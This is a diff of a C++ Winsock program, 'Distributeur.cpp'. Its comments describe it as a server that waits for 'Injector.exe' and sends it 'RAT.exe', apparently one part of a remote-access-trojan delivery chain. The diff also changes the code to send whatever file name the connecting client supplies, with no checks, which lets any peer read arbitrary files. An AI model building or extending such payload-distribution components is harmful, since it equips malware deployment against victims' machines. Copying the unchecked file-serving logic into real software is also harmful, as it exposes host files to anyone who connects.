@@ -1,20 +1,19 @@
 //
-// Client.cpp
+// Distributeur.cpp
 //
-// Extremely simple, stream client example.
-// Works in conjunction with Server.cpp.
+// The program waits for a connection from Injector.exe. Once connected,
+// it expects to receive a file name (RAT.exe) and will send said file to
+// the injector.
+// The program continues to wait for connection until it's console is closed.
 //
-// The program attempts to connect to the server and port
-// specified on the command line. The Server program prints
-// the needed information when it is started. Once connected,
-// the program sends data to the server, waits for a response
-// and then exits.
+// Compile and link with wsock32.lib.
 //
-// Compile and link with wsock32.lib
+// Pass the port number on the command line. 
 //
-// Pass the server name and port number on the command line. 
+// Example: Server.exe 2020
 //
-// Example: Client MyMachineName 2000
+// Written by: Alexandre Cox
+// Date: 04/04/2018
 //
 #include <stdio.h>
 #include <winsock.h>
@@ -29,7 +28,7 @@ using namespace std;
 
 //Define for port and host arguments
 //#define HARD_CODED_ARGS
-#define SERVER_NAME "LAPTOP-M6CC1F8V"
+#define SERVER_NAME "127.0.0.1"
 #define MY_PORT 2020
 
 // Function prototype
@@ -87,8 +86,10 @@ void StreamServer(short nPort)
 		{
 			try
 			{
+				string msg;
 				OpenConnect.WaitRequest();
-				OpenConnect.sendFile("RAT.exe");
+				OpenConnect.recvMessage(msg);
+				OpenConnect.sendFile(msg);
 			}
 			catch (Connection_error ex)
 			{
